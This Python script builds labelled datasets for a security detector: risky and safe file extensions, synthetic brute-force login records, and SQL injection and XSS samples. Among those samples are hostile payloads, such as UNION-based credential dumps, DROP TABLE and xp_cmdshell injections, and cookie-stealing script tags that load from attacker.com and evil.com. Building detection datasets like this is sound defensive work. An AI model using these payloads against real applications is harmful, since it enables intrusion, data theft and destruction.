import os
import sys
import random
import pandas as pd

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(ROOT_DIR)

DATASETS_DIR = os.path.join(ROOT_DIR, "datasets")
os.makedirs(DATASETS_DIR, exist_ok=True)

from backend.services.rule_service import (
    CRITICAL_EXECUTABLES,
    HIGH_RISK_SCRIPTS,
    MACRO_DOCUMENTS,
    SHORTCUTS_AND_CONTAINERS,
    SAFE_EXTENSIONS,
    SQL_KEYWORDS,
    XSS_PATTERNS
)

# =====================================================================
# 1. FILE ANALYZER DATASET
# =====================================================================
print("[1/3] Generating File Analyzer Dataset...")
file_rows = []

# Single Dangerous Extensions
for ext, (desc, mitre) in CRITICAL_EXECUTABLES.items():
    file_rows.append({
        "filename": f"sample_payload{ext}",
        "extension_input": ext,
        "category": "Critical Executable",
        "verdict": "Dangerous",
        "risk_level": "Critical",
        "description": desc,
        "mitre_technique": mitre
    })

for ext, (desc, mitre) in HIGH_RISK_SCRIPTS.items():
    file_rows.append({
        "filename": f"script_task{ext}",
        "extension_input": ext,
        "category": "High-Risk Script / Web Shell",
        "verdict": "Dangerous",
        "risk_level": "High",
        "description": desc,
        "mitre_technique": mitre
    })

for ext, (desc, mitre) in MACRO_DOCUMENTS.items():
    file_rows.append({
        "filename": f"Quarterly_Financials{ext}",
        "extension_input": ext,
        "category": "Macro Maldoc",
        "verdict": "Dangerous",
        "risk_level": "High",
        "description": desc,
        "mitre_technique": mitre
    })

for ext, val in SHORTCUTS_AND_CONTAINERS.items():
    desc = val[0]
    risk = val[1]
    mitre = val[2]
    file_rows.append({
        "filename": f"installer_mount{ext}",
        "extension_input": ext,
        "category": "Container / Shortcut",
        "verdict": "Dangerous" if risk in ["High", "Critical"] else "Suspicious",
        "risk_level": risk,
        "description": desc,
        "mitre_technique": mitre
    })

# Double Extensions (Spoofing & Masquerading)
double_ext_samples = [
    ("Invoice_March2026.pdf.exe", ".pdf.exe", "Double Extension Spoofing", "Dangerous", "Critical", "PE disguised as PDF", "MITRE ATT&CK T1036.007"),
    ("Employee_Salaries.xlsx.vbs", ".xlsx.vbs", "Double Extension Spoofing", "Dangerous", "Critical", "VBScript disguised as Excel", "MITRE ATT&CK T1036.007"),
    ("Scan_Document.docx.scr", ".docx.scr", "Double Extension Spoofing", "Dangerous", "Critical", "Screensaver binary disguised as Word", "MITRE ATT&CK T1036.007"),
    ("Board_Minutes.pdf.hta", ".pdf.hta", "Double Extension Spoofing", "Dangerous", "Critical", "HTML Application disguised as PDF", "MITRE ATT&CK T1036.007"),
    ("Resume_Candidate.pdf.bat", ".pdf.bat", "Double Extension Spoofing", "Dangerous", "Critical", "Batch script disguised as PDF", "MITRE ATT&CK T1036.007"),
    ("Photo_Album.jpg.exe", ".jpg.exe", "Double Extension Spoofing", "Dangerous", "Critical", "Executable disguised as JPEG image", "MITRE ATT&CK T1036.007"),
    ("System_Backup.tar.gz.ps1", ".tar.gz.ps1", "Double Extension Spoofing", "Dangerous", "Critical", "PowerShell script disguised as archive", "MITRE ATT&CK T1036.007"),
    ("Contract_Agreement.doc.js", ".doc.js", "Double Extension Spoofing", "Dangerous", "Critical", "JScript dropper disguised as Word doc", "MITRE ATT&CK T1036.007"),
    ("Release_Update.zip.iso", ".zip.iso", "Container Masquerading", "Dangerous", "High", "Disk image container disguised as ZIP archive", "MITRE ATT&CK T1553.005"),
    ("Payroll_Form.pdf.lnk", ".pdf.lnk", "Shortcut Disguise", "Dangerous", "Critical", "Windows shortcut launcher disguised as PDF", "MITRE ATT&CK T1204.001"),
    # Space padded
    ("Order_Receipt.pdf    .exe", ".exe", "Space Padded Extension Smuggling", "Dangerous", "Critical", "Whitespace padded extension hiding executable", "MITRE ATT&CK T1036.007"),
    ("Urgent_Notice.docx     .vbs", ".vbs", "Space Padded Extension Smuggling", "Dangerous", "Critical", "Space obfuscation before script extension", "MITRE ATT&CK T1036.007"),
    # Benign Multi-Extension
    ("backup_data.tar.gz", ".tar.gz", "Benign Dual Compression", "Safe", "Low", "Standard Unix tarball compressed with gzip", "N/A"),
    ("source_code.tar.bz2", ".tar.bz2", "Benign Dual Compression", "Safe", "Low", "Standard Bzip2 tarball archive", "N/A"),
    ("distribution.tar.xz", ".tar.xz", "Benign Dual Compression", "Safe", "Low", "Standard XZ compressed archive", "N/A"),
]

for fn, ext_inp, cat, verd, risk, desc, mitre in double_ext_samples:
    file_rows.append({
        "filename": fn,
        "extension_input": ext_inp,
        "category": cat,
        "verdict": verd,
        "risk_level": risk,
        "description": desc,
        "mitre_technique": mitre
    })

# Safe Standard Extensions
for ext, desc in SAFE_EXTENSIONS.items():
    file_rows.append({
        "filename": f"sample_document{ext}",
        "extension_input": ext,
        "category": "Legitimate File Format",
        "verdict": "Safe",
        "risk_level": "Low",
        "description": desc,
        "mitre_technique": "None (Safe Standard File)"
    })

df_files = pd.DataFrame(file_rows)
file_csv = os.path.join(DATASETS_DIR, "file_analyzer_dataset.csv")
df_files.to_csv(file_csv, index=False, encoding="utf-8")
print(f" -> Saved {len(df_files)} rows to {file_csv}")


# =====================================================================
# 2. INJECTION CHECK DATASET (SQL Injection & XSS)
# =====================================================================
print("[2/3] Generating Injection Check Dataset (SQLi & XSS)...")
injection_rows = []

# SQL Injection Malicious Payloads
sqli_payloads = [
    ("' OR 1=1 --", "SQLi Tautology Auth Bypass", "Critical"),
    ("admin' --", "SQLi Comment Auth Bypass", "Critical"),
    ("' UNION SELECT null, username, password FROM users --", "SQLi UNION SELECT Data Exfiltration", "Critical"),
    ("1; DROP TABLE users; --", "SQLi Stacked Queries Drop Table", "Critical"),
    ("'; EXEC xp_cmdshell('whoami'); --", "SQLi RCE xp_cmdshell Execution", "Critical"),
    ("' UNION SELECT 1, @@version, user(), 4 --", "SQLi Fingerprinting Info Disclosure", "Critical"),
    ("' OR '1'='1", "SQLi Quoted Tautology Bypass", "Critical"),
    ("1' AND SLEEP(5) --", "SQLi Time-based Blind Injection", "High"),
    ("1' AND (SELECT COUNT(*) FROM users) > 0 --", "SQLi Boolean-based Blind Injection", "High"),
    ("admin' OR 'a'='a", "SQLi Tautology Authentication Bypass", "Critical"),
    ("1 UNION ALL SELECT NULL, NULL, CONCAT(table_schema, '.', table_name) FROM information_schema.tables --", "SQLi Schema Harvesting", "Critical"),
    ("1; INSERT INTO administrators (user, role) VALUES ('hacker', 'admin'); --", "SQLi Privilege Escalation Insert", "Critical"),
    ("'; DELETE FROM audit_logs WHERE 1=1; --", "SQLi Log Tampering Deletion", "Critical"),
    ("1' ORDER BY 10 --", "SQLi Column Enumeration", "Medium"),
    ("1 UNION SELECT 1, load_file('/etc/passwd') --", "SQLi Local File Inclusion via DB", "Critical"),
]

for p, cat, risk in sqli_payloads:
    injection_rows.append({
        "payload": p,
        "attack_type": "SQL Injection",
        "verdict": "Dangerous",
        "risk_level": risk,
        "is_attack": 1,
        "rule_category": cat
    })

# Safe SQL / Search Queries
safe_queries = [
    ("SELECT * FROM products WHERE category = 'electronics' AND price < 500", "Legitimate Parametric Search", "Low"),
    ("John Doe", "Normal Name Search", "Low"),
    ("order_id=49281", "Standard ID Parameter Lookup", "Low"),
    ("laptops and computer accessories", "Text Search Keyword", "Low"),
    ("SELECT count(*) FROM orders WHERE user_id = 42", "Backend Reporting Query", "Low"),
    ("INSERT INTO feedback (comment) VALUES ('Great product, fast shipping!')", "User Feedback Submission", "Low"),
    ("UPDATE users SET theme = 'dark' WHERE id = 12", "User Preference Update", "Low"),
    ("customer_support@example.com", "Plain Email Input", "Low"),
    ("New York, NY 10001", "Address Search", "Low"),
    ("2026-10-12", "Date Range Filter", "Low"),
]

for p, cat, risk in safe_queries:
    injection_rows.append({
        "payload": p,
        "attack_type": "SQL Query / Safe Form",
        "verdict": "Safe",
        "risk_level": risk,
        "is_attack": 0,
        "rule_category": cat
    })

# XSS Malicious Payloads
xss_payloads = [
    ("<script>alert('XSS')</script>", "Stored/Reflected XSS Script Tag", "High"),
    ("<img src=x onerror=alert(document.cookie)>", "DOM XSS Image Tag with Cookie Stealing", "High"),
    ("<svg onload=alert(1)>", "SVG Vector Event Handler XSS", "High"),
    ("javascript:alert(document.domain)", "JavaScript Pseudo-Protocol XSS", "High"),
    ("<iframe src='http://attacker.com/cookie_stealer.php'></iframe>", "IFrame Hijacking Wrapper", "High"),
    ("<body onload=alert('XSS')>", "Body Tag Event Execution", "High"),
    ("'><script src=http://evil.com/payload.js></script>", "Attribute Escape Script Inclusion", "High"),
    ("<input type='text' value='' onfocus='alert(1)' autofocus>", "Autofocus Event Injection", "High"),
    ("<a href='javascript:eval(atob(\"YWxlcnQoMSk=\"))'>Click Here</a>", "Base64 Encoded JS Link", "High"),
    ("<details open ontoggle=alert(document.cookie)>", "HTML5 Details Tag XSS", "High"),
    ("<video><source onerror='javascript:alert(1)'>", "Media Error Event XSS", "High"),
    ("<div style=\"background-image: url('javascript:alert(1)')\">", "CSS Style Protocol Injection", "High"),
]

for p, cat, risk in xss_payloads:
    injection_rows.append({
        "payload": p,
        "attack_type": "Cross-Site Scripting (XSS)",
        "verdict": "Dangerous",
        "risk_level": risk,
        "is_attack": 1,
        "rule_category": cat
    })

# Safe HTML / Text Payloads
safe_texts = [
    ("<b>Hello world! Welcome to our store.</b>", "Safe Formatting Tag", "Low"),
    ("Please contact us at support@cybershield.org for assistance.", "Plain Support Email Text", "Low"),
    ("Math equation: 5 < 10 and 12 > 4", "Mathematical Comparisons", "Low"),
    ("Here is a link: https://google.com/search?q=security", "Safe Web URL String", "Low"),
    ("Review: The 5-star product exceeded all expectations! Recommended.", "Customer Product Review", "Low"),
    ("<p>Paragraph text describing the terms and privacy policy.</p>", "Safe Content HTML Block", "Low"),
    ("User commented: 'Great explanation of OWASP Top 10 vulnerabilities!'", "User Forum Comment", "Low"),
    ("Discount code: SAVE-2026-FALL", "Promotional Voucher Input", "Low"),
]

for p, cat, risk in safe_texts:
    injection_rows.append({
        "payload": p,
        "attack_type": "Safe HTML / Text",
        "verdict": "Safe",
        "risk_level": risk,
        "is_attack": 0,
        "rule_category": cat
    })

df_injection = pd.DataFrame(injection_rows)
injection_csv = os.path.join(DATASETS_DIR, "injection_check_dataset.csv")
df_injection.to_csv(injection_csv, index=False, encoding="utf-8")
print(f" -> Saved {len(df_injection)} rows to {injection_csv}")


# =====================================================================
# 3. LOGIN MONITOR DATASET (Brute Force, Credential Stuffing & Normal)
# =====================================================================
print("[3/3] Generating Login Monitor Dataset...")
random.seed(42)
login_rows = []

usernames = ["admin", "root", "administrator", "jsmith", "devops_service", "saisrinath", "alice", "bob", "billing_admin", "finance_user", "support_rep", "guest"]
internal_ips = ["192.168.1.45", "10.0.0.12", "172.16.0.5", "192.168.1.100", "10.0.4.88"]
external_normal_ips = ["24.120.45.67", "98.140.22.10", "72.14.201.5", "142.250.190.46", "151.101.1.69"]
attacker_ips = ["185.220.101.5", "45.33.32.156", "91.240.118.12", "103.224.182.242", "194.26.29.112", "178.128.242.19", "217.182.197.8"]

# 1. Normal Login Activity (0 to 2 failed attempts in 60s)
for i in range(120):
    user = random.choice(usernames)
    ip = random.choice(internal_ips + external_normal_ips)
    failed_count = random.choice([0, 0, 0, 1, 1, 2])
    window = random.choice([60, 120, 300])
    login_rows.append({
        "username": user,
        "ip_address": ip,
        "failed_attempts": failed_count,
        "window_seconds": window,
        "verdict": "Safe",
        "risk_level": "Low",
        "attack_type": "Normal Login Activity",
        "is_brute_force": 0,
        "action_taken": "Allow login attempt"
    })

# 2. Suspicious Login Activity (3 to 4 failed attempts in 60s)
for i in range(50):
    user = random.choice(usernames)
    ip = random.choice(attacker_ips + external_normal_ips)
    failed_count = random.choice([3, 4])
    window = random.choice([30, 60])
    login_rows.append({
        "username": user,
        "ip_address": ip,
        "failed_attempts": failed_count,
        "window_seconds": window,
        "verdict": "Suspicious",
        "risk_level": "Medium",
        "attack_type": "Multiple Failed Logins Anomaly",
        "is_brute_force": 1,
        "action_taken": "Require CAPTCHA / Alert User"
    })

# 3. Dangerous Brute Force & Credential Stuffing (5 to 50 failed attempts in 30-60s)
for i in range(80):
    user = random.choice(["admin", "root", "administrator", random.choice(usernames)])
    ip = random.choice(attacker_ips)
    failed_count = random.randint(5, 45)
    window = random.choice([15, 30, 60])
    login_rows.append({
        "username": user,
        "ip_address": ip,
        "failed_attempts": failed_count,
        "window_seconds": window,
        "verdict": "Dangerous",
        "risk_level": "Critical",
        "attack_type": "Brute Force / Password Spray Attack",
        "is_brute_force": 1,
        "action_taken": "Lock Account & IP Firewall Block"
    })

df_login = pd.DataFrame(login_rows)
login_csv = os.path.join(DATASETS_DIR, "login_monitor_dataset.csv")
df_login.to_csv(login_csv, index=False, encoding="utf-8")
print(f" -> Saved {len(df_login)} rows to {login_csv}")

print("\nAll 3 additional datasets generated and saved in datasets/ folder!")
